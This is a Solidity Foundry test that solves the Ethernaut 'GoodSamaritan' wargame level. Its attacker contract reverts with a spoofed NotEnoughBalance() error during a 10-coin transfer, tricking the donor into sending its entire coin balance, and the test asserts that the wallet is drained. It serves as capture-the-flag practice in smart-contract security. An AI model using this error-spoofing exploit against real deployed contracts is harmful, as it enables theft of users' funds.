// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GoodSamaritan} from "../src/levels/GoodSamaritan.sol";

/// Ethernaut #27 "GoodSamaritan" → SC02 logic / control-flow via custom errors (no exact catalog
/// entry). The donor sends its *entire* balance if a `NotEnoughBalance()` error bubbles up. The
/// attacker's `notify` (called during the 10-coin transfer) reverts with that exact error, tricking
/// the donor into `transferRemainder`. Win: wallet coin balance == 0.
contract GoodSamaritanAttacker {
    error NotEnoughBalance();

    function attack(GoodSamaritan gs) external {
        gs.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance(); // only on the 10-coin probe; let the full sweep through
        }
    }
}

contract GoodSamaritanTest is Test {
    function test_solve_goodsamaritan() public {
        GoodSamaritan gs = new GoodSamaritan();
        GoodSamaritanAttacker a = new GoodSamaritanAttacker();

        a.attack(gs);

        assertEq(gs.coin().balances(address(gs.wallet())), 0, "drained the wallet's coins");
    }
}
